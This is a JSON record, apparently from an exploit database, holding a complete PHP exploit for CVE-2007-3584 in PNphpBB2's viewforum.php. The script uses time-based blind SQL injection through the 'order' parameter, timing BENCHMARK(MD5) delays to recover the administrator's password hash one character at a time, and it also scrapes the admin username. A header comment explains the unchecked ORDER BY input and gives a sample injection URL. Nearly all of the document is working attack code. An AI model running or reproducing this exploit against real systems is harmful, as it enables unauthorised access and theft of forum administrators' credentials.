{
  "id": "4147",
  "title": "PNPHPBB2 &lt; 1.2i - &#039;viewforum.php&#039; SQL Injection",
  "cve": "CVE-2007-3584",
  "vuln_type": "sqli",
  "code": "/*\r\n[i] PNphpBB2 \"viewforum.php\" SQL Injection Blind Password Hash Fishing Exploit\r\n[i] Vulnerable versions: PNphpBB2 <= 1.2i (current last version)\r\n[i] Bug discovered by: Coloss\r\n[i] Exploit by: Coloss\r\n[i] Date: 03.07.2007\r\n\r\n[Notes]\r\n[->] You need at least 2 posts in the forum.\r\n[->] Thanks to waraxe for exploit structure... I have saved much time :)\r\n\r\n[Tested]\r\n[->] Postnuke 0.764 with PNphpBB2 1.2i and MySQL 5.0.42\r\n     Maybe with other MySQL versions SQL Query should be slightly different\r\n\r\n[Bug Analysis]\r\n\r\nFile: viewforum.php\r\n\r\n   387  if ( isset($HTTP_GET_VARS['order']) || isset($HTTP_POST_VARS['order']) )\r\n   388  {\r\n   389           $sort_order = isset($HTTP_GET_VARS['order']) ? $HTTP_GET_VARS['order'] : $HTTP_POST_VARS['order'];\r\n   390  }\r\n\r\nWe can handle '$sort_order'...\r\n\r\n   415  $sql = \"SELECT t.*, u.username, u.user_id, u2.username as user2, u2.user_id as id2, p.post_username, p2.post_username AS post_username2, p2.post_time\r\n   416          FROM \" . TOPICS_TABLE . \" t, \" . USERS_TABLE . \" u, \" . POSTS_TABLE . \" p, \" . POSTS_TABLE . \" p2, \" . USERS_TABLE . \" u2\r\n   417          WHERE t.forum_id = $forum_id\r\n   418                  AND t.topic_poster = u.user_id\r\n   419                  AND p.post_id = t.topic_first_post_id\r\n   420                  AND p2.post_id = t.topic_last_post_id\r\n   421                  AND u2.user_id = p2.poster_id\r\n   422                  AND t.topic_type <> \" . POST_ANNOUNCE . \"\r\n   423                  $limit_topics_time\r\n   424          ORDER BY t.topic_type DESC, $sort_method $sort_order\r\n   425          LIMIT $start, \".$board_config['topics_per_page'];\r\n\r\n... and this value is used without any check in the sql query.^\r\n\r\nThe only \"problem\" could be that the SQL injection is only possible after an 'ORDER BY' statement... but we should be able (with appropriate MySQL version) to inject a subquery.\r\n\r\nIn this case we can request something like this: \r\nhttp://www.site.com/postnuke/?module=PNphpBB2&file=viewforum&f=1&order=ASC, (SELECT user_password FROM pn_phpbb_users WHERE user_id=2 AND IF(ORD(SUBSTR(user_password,1,1))>52,BENCHMARK(2500000,MD5(71337)),1))\r\n\r\nWith this kind of query we can use an 'if' statement to discover each character of the admin's password hash, analyzing the delay time of server's answers.\r\nIn fact if the 'if' statement results true (ORD() returns the ascii value of a character) the md5() function 'll be repeated 2500000 times and you 'll get a big delay.\r\n\r\nFor more informations study the SQL Functions list.\r\n*/\r\n\r\n$testcnt = 300000;\t\t\t\t// Use bigger numbers, if server is slow\r\n$fid = 1;\t\t\t\t\t// Forum ID\r\n$prefix = \"pn_\";\t\t\t\t// SQL Table prefix\r\n$adminid = 2;\t\t\t\t\t// Admin user id, default: 2\r\n\r\n$opts = getopt(\"u:f:U:P:o:\");\r\n\r\nprint \r\n\"[i] PNphpBB2 \\\"viewforum.php\\\" SQL Injection Blind Password Hash Fishing Exploit\r\n[i] Vulnerable versions: PNphpBB2 <= 1.2i (current last version)\r\n[i] Bug discovered by: Coloss\r\n[i] Exploit by: Coloss\r\n[i] Date: 03.07.2007\\n\\n\";\r\n\r\n\r\nif ($opts[u] == '')\r\n\tdie (help($argv[0]));\r\n\r\nif (strncmp($opts[u], \"http\",4))\r\n\t$url = 'http://'.$opts[u];\r\nelse\r\n\t$url = $opts[u];\r\n\r\nif ($opts[U])\r\n\t$user = $opts[U];\r\nif ($opts[P])\r\n\t$hash = $opts[P];\r\nif ($opts[o])\r\n\t$file = $opts[o];\r\nif ($opts[f])\r\n\t$fid = (int) $opts[f];\r\n\r\necho \"[+] Target: $url\\n\";\r\n\r\n$norm_delay = 0;\r\necho \"[+] Testing probe delays... \\n\"; \r\n$norm_delay = get_normdelay($testcnt);\r\necho \"[-] Normal delay: $norm_delay deciseconds\\n\";\r\n\r\nif (!$user) {\r\n\techo \"[+] Trying to find admin username... \";\r\n\t$user = find_username();\r\n}\r\n\r\n$field = 'user_password';\r\n\r\nif (!$hash) {\r\n\techo \"\\n[+] Trying to find Password MD5 Hash...\\n\\n\";\r\n\t$hash = get_hash();\r\n}\r\n\r\necho\"[-] Finished!\\n\";\r\n\r\nowrite(\"\\n[->] Target: $url\\n\");\r\nowrite(\"[->] Username: $user\\n\");\r\nowrite(\"[->] Password MD5 Hash: $hash\\n\");\r\n\r\nfunction get_hash()\r\n{\r\n\tglobal $field;\r\n\r\n\t$len = 32;\r\n\t$out = '';\r\n   \r\n\tfor($i = 1; $i < $len + 1; $i ++) {\r\n\t\t$ch = get_hashchar($i);\r\n\t\t$out .= \"$ch\";\r\n\t\techo \"[->] Current '$field' ($i): $out \\n\";\r\n\t}\r\n\techo \"\\n[-] Found Password Hash: $out\\n\\n\";\r\n\treturn $out;\r\n}\r\n\r\n\r\nfunction get_hashchar($pos)\r\n{\r\n\tglobal $fid, $testcnt, $field, $adminid, $prefix;\r\n\t$char = '';\r\n\t$cnt = $testcnt * 5;\r\n\r\n\t$sql = \"ASC, (SELECT \".$field.\" FROM \".$prefix.\"phpbb_users WHERE user_id=\".$adminid.\" AND IF(ORD(SUBSTR(\".$field.\",\".$pos.\",1))%s,BENCHMARK(\".$cnt.\",MD5(71337)),1))\";\r\n\t$post = \"name=PNphpBB2&file=viewforum&f=\".$fid.\"&order=\".$sql;\r\n\r\n\t$req = sprintf($post, \">57\");\r\n\t\r\n\t$letter = test_condition($req);\r\n\r\n\tif ($letter) {\r\n\t\t$min = 97;\r\n\t\t$max = 102;\r\n\t}\r\n\telse {\r\n\t\t$min = 48;\r\n\t\t$max = 57;\r\n\t}\r\n\r\n\t$curr = 0;\r\n   \r\n\twhile(1) {\r\n\t\t$area = $max - $min;\r\n\t\tif ($area < 2 ) {\r\n\t\t\t$req = sprintf($post, \"=$max\");\r\n\r\n\t\t\t$eq = test_condition($req);\r\n         \r\n\t\t\tif($eq)\r\n\t\t\t\t$char = chr($max);\r\n\t\t\telse\r\n\t\t\t\t$char = chr($min);\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\t$half = intval(floor($area / 2));\r\n\t\t$curr = $min + $half;\r\n      \r\n\t\t$req = sprintf($post, \">$curr\");\r\n\t\techo $req;\r\n\r\n\t\t$bigger = test_condition($req);\r\n      \r\n\t\tif ($bigger)\r\n\t\t\t$min = $curr;\r\n\t\telse\r\n\t\t\t$max = $curr;\r\n\t}\r\n\treturn $char;\r\n}\r\n\r\nfunction test_condition($req)\r\n{\r\n\tglobal $url, $norm_delay;\r\n\r\n\t$bool = false;\r\n   \r\n\t$start = getmicrotime();\r\n\t$buff = Send($url, $req);\r\n\t$end = getmicrotime();\r\n\r\n\t$diff = $end - $start;\r\n\t$delay = intval($diff * 10);\r\n   \r\n\tif ($delay > ($norm_delay * 2))\r\n\t\t$bool = true;\r\n\treturn $bool;\r\n}\r\n\r\n\r\nfunction get_normdelay($testcnt)\r\n{\r\n\t$nda = test_md5delay(1);\r\n\t$da = test_md5delay($testcnt);\r\n\t$ndb = test_md5delay(1);\r\n\t$db = test_md5delay($testcnt);\r\n\t$ndc = test_md5delay(1);\r\n\t$dc = test_md5delay($testcnt);\r\n\r\n\t$mean_delayed = intval(($da + $db + $dc) / 3);\r\n   \r\n\treturn $mean_delayed;\r\n}\r\n\r\nfunction test_md5delay($cnt)\r\n{\r\n\tglobal $url, $fid, $prefix, $adminid, $prefix;\r\n   \r\n\t$delay = -1;\r\n\t\r\n\t$sql = \"ASC, (SELECT user_password FROM \".$prefix.\"phpbb_users WHERE u.user_id=\".$adminid.\" AND IF(LENGTH(user_password)>31,BENCHMARK(\".$cnt.\",MD5(71337)),1))\";\r\n\t$req = \"name=PNphpBB2&file=viewforum&f=\".$fid.\"&order=\".$sql;\r\n\r\n\t$start = getmicrotime();\r\n\t$buff = Send($url, $req);\r\n\t$end = getmicrotime();\r\n\r\n\tif (strstr($buff, \"Could not obtain topic information\"))\r\n\t\tdie(\"[X] Something is wrong... (maybe SQL Query)\\n\");\r\n\telse if (strstr($buff, \"The forum you selected does not exist\"))\r\n\t\tdie(\"[X] The Forum doesn't exist.. change 'fid' value\\n\");\r\n\r\n\t$diff = $end - $start;\r\n\t$delay = intval($diff * 10);\r\n\r\n\treturn $delay;\r\n}\r\n\r\nfunction getmicrotime()\r\n{\r\n\tlist($usec, $sec) = explode(\" \", microtime());\r\n\treturn ((float)$usec + (float)$sec);\r\n}\r\n\r\nfunction Send($url, $req='')\r\n{\r\n\t$ch = curl_init();\r\n\r\n\tcurl_setopt ($ch, CURLOPT_URL, $url);\r\n\tcurl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);\r\n\tcurl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 60);\r\n\r\n\tif ($req) {\r\n\t\tcurl_setopt($ch, CURLOPT_POST, 1);\r\n\t\tcurl_setopt($ch, CURLOPT_POSTFIELDS, $req);\r\n\t}\r\n\r\n\tcurl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);\r\n\tcurl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');\r\n\r\n\tcurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);\r\n\r\n\t$html = curl_exec($ch);\r\n\tcurl_close($ch);\r\n   \r\n\treturn $html;\r\n}\r\n\r\n\r\nfunction help ($prog)\r\n{\r\n\tprint \"[-] Usage: $prog \r\n\t -u  <url>\t-> Sets Target url\r\n\t[-f] <id>\t-> Sets forum id\r\n\t[-U] <user>\t-> Sets username\r\n\t[-P] <pass>\t-> Sets password\r\n\t[-o] <file>\t-> Writes results to a file\\n\";\r\n}\r\n\r\n\r\nfunction owrite ($msg)\r\n{\r\n\tglobal $file;\r\n\r\n\techo $msg;\r\n\r\n\tif ($file) {\r\n\t\tif (!($h = fopen($file, 'ab'))) {\r\n\t\t\techo \"[X] Cannot open '$file'\\n\";\r\n\t\t\treturn;\r\n\t\t}\r\n\t\tif (fwrite($h, $msg) === FALSE)\r\n\t\t\techo \"[X] Cannot write to '$file'\\n\";\r\n\t\tfclose($h);\r\n\t}\r\n}\t\r\n\r\nfunction find_username ()\r\n{\r\n\tglobal $url, $fid, $adminid;\r\n\r\n\t$req = \"name=PNphpBB2&file=viewforum&f=\".$fid;\r\n\t$str = \"file=profile&mode=viewprofile&u=\".$adminid;\r\n\r\n\t$html = Send($url, $req);\r\n\r\n\tif (strstr($html, $str)) {\r\n\t\t$u = substr($html,strpos($html,$str)+strlen($str),strpos(substr($html,strpos($html,$str)+strlen($str),strlen($html)), \"<\"));\r\n\t\t$u = substr($u, strpos($u, \">\")+1, strlen($u)-strpos($u, \">\"));\r\n\t\techo \"found: '$u'\\n\";\r\n\t}\r\n\telse\r\n\t\techo \"failed: probably he has not posted in this forum (or maybe he has a different user id)\\n\";\r\n\treturn $u;\r\n}\r\n?>\r\n\r\n# milw0rm.com [2007-07-03]",
  "url": "https://www.exploit-db.com/exploits/4147"
}